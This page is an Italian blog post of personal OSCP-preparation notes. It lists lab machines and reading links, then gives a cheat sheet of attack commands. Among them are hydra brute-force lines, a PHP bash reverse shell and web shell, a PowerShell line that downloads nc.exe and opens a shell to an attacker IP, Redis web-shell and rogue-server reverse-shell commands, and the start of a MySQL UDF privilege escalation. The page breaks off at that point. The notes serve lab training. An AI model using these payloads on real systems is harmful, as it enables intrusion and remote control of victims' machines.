<!DOCTYPE html>



<html lang="en-US" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  
    <meta name="pv-cache-enabled" content="false">

    
  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="Machine" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="SE DOVESSI AVERE PROBLEMI CON LA SHARED FOLDER, ESEGUI QUESTO COMANDO vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000" />
<meta property="og:description" content="SE DOVESSI AVERE PROBLEMI CON LA SHARED FOLDER, ESEGUI QUESTO COMANDO vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000" />
<link rel="canonical" href="http://0.0.0.0:4000/posts/posts/machine/" />
<meta property="og:url" content="http://0.0.0.0:4000/posts/posts/machine/" />
<meta property="og:site_name" content="CinnamonSec" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-04-11T00:00:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Machine" />
<meta name="twitter:site" content="@_cinnamon_92" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/posts/posts/machine/"},"@type":"BlogPosting","url":"http://0.0.0.0:4000/posts/posts/machine/","headline":"Machine","dateModified":"2021-04-11T00:00:00+02:00","datePublished":"2021-04-11T00:00:00+02:00","description":"SE DOVESSI AVERE PROBLEMI CON LA SHARED FOLDER, ESEGUI QUESTO COMANDO vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>Machine | CinnamonSec
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://www.favicon-generator.org/
-->



<link rel="shortcut icon" href="/posts/assets/img/favicons/favicon.ico" type="image/x-icon">
<link rel="icon" href="/posts/assets/img/favicons/favicon.ico" type="image/x-icon">

<link rel="apple-touch-icon" href="/posts/assets/img/favicons/apple-icon.png">
<link rel="apple-touch-icon" href="/posts/assets/img/favicons/apple-icon-precomposed.png">
<link rel="apple-touch-icon" sizes="57x57" href="/posts/assets/img/favicons/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/posts/assets/img/favicons/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/posts/assets/img/favicons/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/posts/assets/img/favicons/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/posts/assets/img/favicons/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/posts/assets/img/favicons/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/posts/assets/img/favicons/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/posts/assets/img/favicons/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/posts/assets/img/favicons/apple-icon-180x180.png">

<link rel="icon" type="image/png" sizes="192x192"  href="/posts/assets/img/favicons/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="/posts/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="/posts/assets/img/favicons/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="/posts/assets/img/favicons/favicon-16x16.png">

<link rel="manifest" href="/posts/assets/img/favicons/manifest.json">
<meta name='msapplication-config' content='/posts/assets/img/favicons/browserconfig.xml'>
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="/posts/assets/img/favicons/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
    integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous">

  <!-- Font Awesome -->
  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"
    integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ="
    crossorigin="anonymous">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/posts/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- JavaScripts -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  





<script defer src="/posts/assets/js/dist/post.min.js"></script>






</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/posts/" alt="avatar" class="mx-auto">
        
        <img src="/posts/assets/img/favicon.jpg" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/posts/">CinnamonSec</a>
    </div>

    <div class="site-subtitle font-italic">Security enthusiast.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/posts/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/posts/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/posts/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/posts/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/posts/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/nananan" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/_cinnamon_92" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['eliana-c','live.it'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/posts/feed.xml" aria-label="rss"
        class="order-6"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
        <span>
          
          
          <a href="/posts/">
            Posts
          </a>
        </span>

        

      

        
          <span>Machine</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->




<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>Machine</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Eliana Cannella
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sun, Apr 11, 2021, 12:00 AM +0200"
  

  
  prep="on" >

  
  

  
    Apr 11
  

  <i class="unloaded">2021-04-11T00:00:00+02:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6397 words">35 min</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        
<p><strong>SE DOVESSI AVERE PROBLEMI CON LA SHARED FOLDER, ESEGUI QUESTO COMANDO</strong>
vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000</p>

<p>E poi trovi la cartella /nmt/hgfs/shared</p>

<h4 id="tryehackme---offensive-path">TryeHackMe - Offensive Path:</h4>
<p>(Scadenza 3/05/2021)</p>
<ul>
  <li>Advanced Exploitation
    <ul>
      <li>
        <s>Game Zone</s>
      </li>
      <li>
        <s>Skynet</s>
        <p>– possibile articolo</p>
      </li>
      <li>
        <s>Daily Bugle</s>
      </li>
      <li>
        <s>Overpass 2 - Hacked</s>
      </li>
      <li>
        <s>Relevant</s>
      </li>
      <li>
        <s>Internal</s>
        <p>– possibile articolo (Port Forwarding)</p>
      </li>
    </ul>
  </li>
  <li>Buffer Overflow Exploitation
    <ul>
      <li>Buffer Overflow Prep</li>
      <li>
        <s>Brainstorm</s>
      </li>
      <li>
        <s>Gatepeeker</s>
      </li>
      <li>
        <s>Brainpan 1</s>
      </li>
    </ul>
  </li>
  <li>Active Directory
    <ul>
      <li>
        <s>Active Directory Basics</s>
 	- Attacking Kerberos
 	- Attacktive Directory
 	- <s>Post-Exploitation Basics</s>
      </li>
    </ul>
  </li>
  <li>Extra Credits
 	- Hacking with Powershell
 	- Corp
 	- <s>Mr Robot CTF</s>
 	- <s>Retro</s></li>
</ul>

<h4 id="vulnhub">Vulnhub:</h4>
<p>Beginner friendly</p>
<ul>
  <li>
    <s>Kioptrix: Level 1</s>
  </li>
  <li>
    <s>Kioptrix: Level 1.1</s>
  </li>
  <li>
    <s>Kioptrix: Level 1.2</s>
  </li>
  <li>
    <s>Kioptrix: Level 1.3</s>
  </li>
  <li>
    <s>FristiLeaks 1.3</s>
  </li>
  <li>
    <s>Stapler 1</s>
  </li>
  <li>
    <s>PwnLab: Init</s>
    <p>Intermediate</p>
  </li>
  <li>
    <s>Kioptrix: 2014</s>
  </li>
  <li>
    <s>Brainpan: 1</s>
  </li>
  <li>
    <s>Mr-Robot: 1</s>
  </li>
  <li>
    <s>HackLAB: Vulnix</s>
  </li>
  <li>VulnOS 2</li>
  <li>SickOS 1.2</li>
  <li>/dev/random:scream</li>
  <li>pWnOS 2.0</li>
  <li>SkyTower 1</li>
  <li>IMF</li>
  <li>Metasploitable 3</li>
  <li>Lin. Security</li>
  <li>Temple of Doom</li>
  <li>Pinkys Palace v1</li>
  <li>Pinkys Palace v2</li>
  <li>Zico2</li>
  <li>Wintermute</li>
  <li>Lord of root 1.0.1</li>
  <li>Tr0ll 1</li>
  <li>Tr0ll 2</li>
  <li>Web Developer 1</li>
  <li>
    <p>SoliState</p>
  </li>
  <li>OSCP (https://www.vulnhub.com/entry/infosec-prep-oscp,508/)</li>
</ul>

<p>https://zayotic.com/posts/oscp-like-vulnhub-vms/</p>

<p>https://www.offensive-security.com/labs/individual/</p>

<h4 id="proving-grounds">Proving Grounds:</h4>
<p>Windows</p>
<ul>
  <li>Nickel</li>
  <li>
    <s>Slort</s>
  </li>
  <li>Authby</li>
  <li>Jacko</li>
  <li>MeatHead</li>
  <li>UT99</li>
  <li>MedJed</li>
  <li>
    <s>Algernon</s>
    <p>(magari rifare)</p>
  </li>
  <li>Billyboss</li>
</ul>

<p>Linux</p>
<ul>
  <li>
    <s>ClamAV</s>
  </li>
  <li>
    <s>Wombo</s>
  </li>
  <li>Payday</li>
  <li>Fail</li>
  <li>Nibbles</li>
  <li>Banzai</li>
  <li>Hunit</li>
  <li>Dibble</li>
  <li>Zino</li>
  <li>Hetemit
Other</li>
  <li>Bratarina</li>
  <li>Internal</li>
  <li>Clyde</li>
  <li>Vector</li>
  <li>Shifty</li>
</ul>

<h4 id="hack-the-box">Hack The Box:</h4>
<ul>
  <li>Linux
    <ul>
      <li>Lame</li>
      <li>brainfuck</li>
      <li>shocker</li>
      <li>bashed</li>
      <li>nibbles</li>
      <li>beep</li>
      <li><em>cronos</em></li>
      <li>nineveh</li>
      <li><em>sense</em></li>
      <li>solidstate</li>
      <li>kotarak</li>
      <li>node</li>
      <li>valentine</li>
      <li>poison</li>
      <li>sunday</li>
      <li>tartarsauce</li>
    </ul>
  </li>
  <li>Windows
    <ul>
      <li>legacy</li>
      <li>Blue</li>
      <li>Devel</li>
      <li>Optimum</li>
      <li>Bastard</li>
      <li>granny</li>
      <li>Artic</li>
      <li>grandpa</li>
      <li>silo</li>
      <li>bounty</li>
      <li>jerry</li>
    </ul>
  </li>
  <li>Other
    <ul>
      <li><em>Jeeves (Windows)</em></li>
      <li>Bart (Windows)</li>
      <li>Tally (WIndows)</li>
      <li>Active (Windows)</li>
      <li>Jail (Linux)</li>
      <li>falafel (Linux)</li>
      <li>Devops (Linux)</li>
      <li>Hawk (Linux)</li>
    </ul>
  </li>
</ul>

<p>Exam Prep
Your Practice Environment:
Buffer Overflow Machine (25 Points)
Jeeves (25 Points)
Chatterbox (20 Points)
Cronos (20 Points)
Sense (10 Points)</p>

<h4 id="macchine-htbvulnhubproving-grounds">Macchine HTB/Vulnhub/Proving Grounds:</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159
</pre></td></tr></tbody></table></code></div></div>

<h4 id="articoli-da-leggere">Articoli da Leggere:</h4>
<p>https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html
https://www.exploit-db.com/papers/42556
https://hacktips.it/guida-privilege-escalation-sistemi-windows/
https://hacktips.it/guida-privilege-escalation-sistemi-linux/</p>

<p>Windows Task Scheduled</p>

<p>Librotto</p>

<p>https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt</p>

<p>Reverse shell explain:
https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/</p>

<p>Github resources:
https://github.com/ferreirasc/oscp</p>

<p>SMB
Buffer Overflow
Privilege Escalation
	Windows
	Linux</p>

<p>Windows Task Scheduled</p>

<p>Port Forwarding
SSH Tunneling</p>

<p>Grep</p>

<p>Privilege Escalation:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</p>

<p>Windows Kernel Exploit:
https://github.com/SecWiki/windows-kernel-exploits/</p>

<p>WordPress exploit plugin:
https://dl.packetstormsecurity.net/papers/attack/exploiting-uploads.pdf</p>

<p>WinPEAS:
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe</p>

<h3 id="url-encode-decode">URL Encode-Decode</h3>
<p>https://www.url-encode-decode.com/</p>

<h3 id="armageddon---htb">Armageddon - HTB</h3>
<p>mysql -u drupaluser -pPASSWORD -e ‘show databases;’
mysql -u drupaluser -pPASSWORD -D drupal -e ‘show tables;’
mysql -u drupaluser -pPASSWORD -D drupal -e ‘select * from users;’
mysql -u drupaluser -pPASSWORD -D drupal -e ‘select name,pass from users;’</p>

<p>mysql -u john -phiroshima -e ‘SHOW VARIABLES LIKE “%version%”;’</p>

<p>python windows-exploit-suggester.py –database <xls database="" of="" exploits="" provided="" with="" the="" script=""> --systeminfor <systeminfo saved="" in="" a="" txt="" file=""> --ostext <Os> -l</Os></systeminfo></xls></p>

<p>TryHackMe - Retro (altro privilege escalation molto interessante):
https://muirlandoracle.co.uk/2020/01/06/retro-write-up/</p>

<h3 id="hydra">Hydra</h3>
<p>└─$ Wordpress
<code class="language-plaintext highlighter-rouge">hydra -l elliot -P fsocity.dic 192.168.1.192 -V http-form-post '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.1.192%2Fwp-admin%2F&amp;testcookie=1:F=is incorrect'</code></p>

<p>└─$ Ssh
(In questo caso sto facendo bruteforce sul nome dell’utente)</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>hydra -L users.txt -p "plbkac" 192.168.1.14 -t 4 ssh
</pre></td></tr></tbody></table></code></div></div>

<h3 id="download---linux">Download - Linux</h3>
<p>Se non c’è nè wget nè curl:
https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>/usr/bin/printf 'GET /26368.c \n' | nc 192.168.1.125 80 &gt; exp.c
</pre></td></tr></tbody></table></code></div></div>

<h3 id="apache">Apache</h3>
<p>FreeBSD
	/usr/local/etc/apache22/httpd.conf</p>

<h3 id="altri-file-di-log">Altri file di log:</h3>
<p>/var/log/sendmail.st.0
/root/.history
/var/log/httpd-access.log
/var/log/httpd-error.log
/usr/local/ossec-hids/logs/alerts/alerts.log
/var/log/messages
/var/log/lpd-errs
/var/log/auth.log
/var/log/maillog
/var/log/security
/var/log/userlog
/var/log/xferlog
/var/log/cron
/var/log/sendmail.st
/var/log/utx.lastlogin
/var/log/utx.log
/var/log/ppp.log
/var/log/debug.log</p>

<h3 id="reverse-shell-php">Reverse shell php:</h3>
<p>&lt;?php exec("/bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/’10.8.80.159’/4444 0&gt;&amp;1’");?&gt;</p>

<p>&lt;?php system($_GET[‘cmd’]); ?&gt;</p>

<h3 id="php--powershell-windows">Php + Powershell (Windows):</h3>
<p>&lt;?php system(“powershell -Command "&amp; {(New-Object System.Net.WebClient).DownloadFile(‘http://10.8.80.159/nc.exe’,’nc.exe’); cmd /c nc.exe 10.8.80.159 4444 -e cmd.exe" }”); ?&gt;</p>

<h3 id="spawn-an-interactive-shell">Spawn an interactive shell</h3>
<p>python -c ‘import pty; pty.spawn(“/bin/bash”)’
python -c ‘import pty; pty.spawn(“/bin/sh”)’</p>

<h3 id="nikto">Nikto</h3>
<p>nikto -h $IP</p>

<h3 id="redis">Redis</h3>
<p>$ redis-cli -h 10.10.239.36 -p 6379</p>

<p>Per fare una reverse shell:
https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</p>

<p>10.10.239.36:6379&gt; config set dir /var/www/html
OK
10.10.239.36:6379&gt; config set dbfilename shell.php
OK
10.10.239.36:6379&gt; set test “&lt;?php exec("/bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/’10.8.80.159’/4444 0&gt;&amp;1’");?&gt;”
OK
10.10.239.36:6379&gt; save
OK</p>

<p>In questo caso, essendoci un server apache sulla 80 ho potuto accederci tramite:
https://10.10.239.36/shell.php</p>

<h5 id="redis-4x5x-rce">Redis 4.x/5.x RCE</h5>
<p>Con MSF: linux/redis/redis_replication_cmd_exec</p>

<p>Con exploit GITHUB: https://github.com/vulhub/redis-rogue-getshell</p>

<p>Già scaricato in <strong>~/Programs</strong> ed eseguire:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sudo python3 redis-master.py -r 192.168.199.69 -p 6379 -L 192.168.49.199 -P 6379 -f RedisModulesSDK/exp.so -c "/usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.199\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
</pre></td></tr></tbody></table></code></div></div>

<h3 id="netdiscover">Netdiscover:</h3>
<p>netdiscover -i eth0</p>

<h3 id="samba--smbclient">Samba / smbclient:</h3>

<p>Per vedere i workgroup:
└─$ nmblookup -A 192.168.1.104
Looking up status of 192.168.1.104
	KIOPTRIX        &lt;00&gt; -         B <ACTIVE> 
	KIOPTRIX        &lt;03&gt; -         B <ACTIVE> 
	KIOPTRIX        &lt;20&gt; -         B <ACTIVE> 
	..__MSBROWSE__. &lt;01&gt; - <GROUP> B <ACTIVE> 
	MYGROUP         &lt;00&gt; - <GROUP> B <ACTIVE> 
	MYGROUP         &lt;1d&gt; -         B <ACTIVE> 
	MYGROUP         &lt;1e&gt; - <GROUP> B <ACTIVE></ACTIVE></GROUP></ACTIVE></ACTIVE></GROUP></ACTIVE></GROUP></ACTIVE></ACTIVE></ACTIVE></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>MAC Address = 00-00-00-00-00-00
</pre></td></tr></tbody></table></code></div></div>

<p>Se dovesse uscire l’errore:</p>

<p>protocol negotiation failed: NT_STATUS_IO_TIMEOUT</p>

<p>Bisogna settargli la versione minima del protocollo aggiungendo:
–option=’client min protocol = NT1’
oppure 
modificare il file <strong>/etc/samba/smb.conf</strong> aggiungendo nella sezione “[global]” “client min protocol = NT1” e riavviare samba con il comando <code class="language-plaintext highlighter-rouge">sudo service smbd restart</code></p>

<p>Per vedere invece la versione, si può sniffare il traffico e poi eseguire smbclient e il pacchetto con Info “Session Setup AndX Response” ci dà la versione, per esempio “Samba 2.2.1a”
Ci sarebbe anche lo script smb-ver.sh ma non è molto affidabile (pare)</p>

<p>Enumerazione NetBIOS usando nmap:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre>$ nmap -sC --script=smb-enum-users $IP

Starting Nmap 7.40 ( https://nmap.org ) at 2016-12-29 02:37 CST
Nmap scan report for 192.168.1.14
Host is up (0.00096s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:8B:97:53 (VMware)

Host script results:
| smb-enum-users: 
|   KIOPTRIX4\john (RID: 3002)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\loneferret (RID: 3000)
|     Full name:   loneferret,,,
|     Flags:       Normal user account
|   KIOPTRIX4\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Normal user account
|   KIOPTRIX4\robert (RID: 3004)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\root (RID: 1000)
|     Full name:   root
|_    Flags:       Normal user account


Nmap done: 1 IP address (1 host up) scanned in 2.85 seconds
</pre></td></tr></tbody></table></code></div></div>

<p>Escaping Restricted Linux Shells
https://www.sans.org/blog/escaping-restricted-linux-shells/
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>john:~$ echo os.system('/bin/bash')
</pre></td></tr></tbody></table></code></div></div>

<h3 id="mysql">MySQL</h3>

<p>Se trovi un mysql con accesso di root, puoi sfruttare la vuln nota MySQL UDF
In questo link https://www.exploit-db.com/exploits/46249 MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit</p>

<p>Prima devi vedere se MySQL sta eseguendo con privilegi di root:</p>

<p>$ ls -la /usr/lib/lib_mysqludf_sys.so 
-rw-rw-rw- 1 root root 12896 2012-02-04 10:08 /usr/lib/lib_mysqludf_sys.so</p>

<p>Poi puoi sfruttare la vuln: (In questo caso si danno i privilegi di admin all’utente john) https://lifesfun101.github.io/2019/09/05/kioptrix-1.3-walkthrough.html</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre>john@Kioptrix4:/var/www$ mysql -h localhost -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 105
